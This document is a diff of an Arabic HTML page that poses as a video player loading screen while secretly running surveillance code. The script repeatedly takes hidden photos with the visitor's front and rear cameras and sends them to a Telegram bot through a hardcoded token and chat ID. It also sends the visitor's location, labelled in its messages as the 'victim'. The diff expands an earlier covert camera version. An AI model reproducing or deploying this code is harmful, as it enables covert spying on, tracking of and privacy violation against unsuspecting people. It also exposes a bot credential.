@@ -1,56 +1,123 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل المحتوى...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تهيئة المشغل، يرجى الانتظار...</title>
     <style>
-        body { background-color: #000; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        video { display: none; } /* إخفاء الفيديو ليكون العمل سرياً */
+        body { background-color: #000; color: #333; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
+    <div class="loader"></div>
+    <p>جاري تحميل المحتوى، يرجى السماح بالأذونات المطلوبة...</p>
+
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <canvas id="canvas"></canvas>
 
     <script>
+        // بيانات تليجرام الخاصة بك
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        let currentStream = null;
 
-        // طلب إذن الكاميرا
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
-                // البدء في التقاط الصور كل 2 ثانية وإرسالها
-                setInterval(captureAndSend, 2000);
-            } catch (err) {
-                console.error("Error accessing camera: ", err);
+        // دالة مساعدة لإغلاق الكاميرا الحالية
+        function stopCurrentStream() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
             }
         }
 
-        // تحويل الصورة وإرسالها لبوت تليجرام
-        function captureAndSend() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg', 0.5); // جودة 50% لسرعة الإرسال
+        // دالة لإرسال رسالة نصية لبوت تليجرام
+        function sendTelegramMessage(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
 
-        window.onload = startCamera;
+        // دالة لإرسال الصورة لبوت تليجرام
+        function sendPhotoToTelegram(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'image.jpg');
+            formData.append('caption', caption); // إضافة وصف للصورة (أمامية أو خلفية)
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // التقاط صورة من الستريم الحالي
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                const context = canvas.getContext('2d');
+                // انتظر قليلاً لضمان استقرار الصورة بعد فتح الكاميرا
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(resolve, 'image/jpeg', 0.5); // جودة 50%
+                }, 1000); // انتظار ثانية واحدة
+            });
+        }
+
+        // الدالة الرئيسية للدورة (أمامية ثم خلفية)
+        async function startSurveillanceCycle() {
+            while (true) { // حلقة تكرار لا نهائية
+                try {
+                    // 1. محاولة فتح الكاميرا الأمامية
+                    stopCurrentStream();
+                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    video.srcObject = currentStream;
+                    await video.play();
+                    
+                    // التقاط وإرسال الصورة الأمامية
+                    const frontBlob = await capturePhoto();
+                    if (frontBlob) sendPhotoToTelegram(frontBlob, "📸 صورة من الكاميرا الأمامية");
+
+                    // 2. محاولة فتح الكاميرا الخلفية
+                    stopCurrentStream();
+                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+                    video.srcObject = currentStream;
+                    await video.play();
+
+                    // التقاط وإرسال الصورة الخلفية
+                    const backBlob = await capturePhoto();
+                    if (backBlob) sendPhotoToTelegram(backBlob, "📸 صورة من الكاميرا الخلفية");
+
+                } catch (err) {
+                    console.error("خطأ في الوصول للكاميرا:", err);
+                    // في حال رفض الإذن أو عدم وجود كاميرا، أرسل تنبيهاً وتوقف قليلاً
+                    sendTelegramMessage("⚠️ تعذر الوصول لإحدى الكاميرات (قد يكون تم رفض الإذن).");
+                    await new Promise(r => setTimeout(r, 10000)); // انتظر 10 ثواني قبل المحاولة مجدداً
+                }
+                
+                // انتظار قصير قبل بدء الدورة التالية
+                await new Promise(r => setTimeout(r, 2000)); 
+            }
+        }
+
+        // تشغيل الدورة عند تحميل الصفحة
+        window.onload = () => {
+            // محاولة إرسال الموقع الجغرافي أولاً
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const mapLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        sendTelegramMessage(`📍 تم تحديد موقع الضحية:\n${mapLink}`);
+                    },
+                    () => sendTelegramMessage("❌ الضحية رفض إذن الموقع.")
+                );
+            }
+            // بدء دورة التصوير
+            startSurveillanceCycle();
+        };
     </script>
 </body>
 </html>
